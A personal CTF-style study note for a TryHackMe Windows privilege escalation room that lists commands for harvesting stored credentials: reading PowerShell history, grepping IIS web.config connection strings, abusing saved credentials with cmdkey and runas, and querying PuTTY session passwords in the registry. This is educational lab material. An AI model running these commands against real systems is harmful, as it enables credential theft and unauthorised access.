# Windows Privilege Escalation Notes.

> These are my personal cybersecurity learning notes written in my own words.
> I do not publish flags, direct answers, private-room solutions, or copied premium content.

## Platform

TryHackMe

## Topic

Windows Privilege Escalation

# Step 1:

First, connect to the box using the given box IP.

```bash
xfreerdp /v:xx:xx:xx:xx(your_Box_IP) /u:name /p:password/
```

# Step 2:

## Task 3: Harvesting Passwords from Usual Spots

### 1. A password for the julia.jones user has been left on the Powershell history. What is the password?

## Lesson:

The question mentioned that the password has been left in the Powershell history, so we can dump the Powershell history by using the following command:

```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Mistake I made:

I first tried to dump the history in `cmd.exe` using:

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

There is a slight change in the command. `$Env:userprofile` replaces `%userprofile%` in the header.

### 2. A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?

## Lesson:

A quick way to find database connection strings on the system:

```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

Just put the command in Powershell, and you will find the password.

### 3. There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.

## Lesson:

To spawn a shell for any user, we first list the admins using:

```cmd
cmdkey /list
```

Then we use:

```cmd
runas /savecred /user:adminname(required admin name) cmd.exe
```

That redirects to the admin’s machine. Then we can find the data, like the flag for this question.

So, I added two screenshots.

### 4. Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?

## Lesson:

The question mentioned saved PuTTY sessions, so we will use the command:

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

And we will get the password.

## End of Task 3

# Tags

#windows #privilege-escalation #tryhackme #crta-prep #redteam
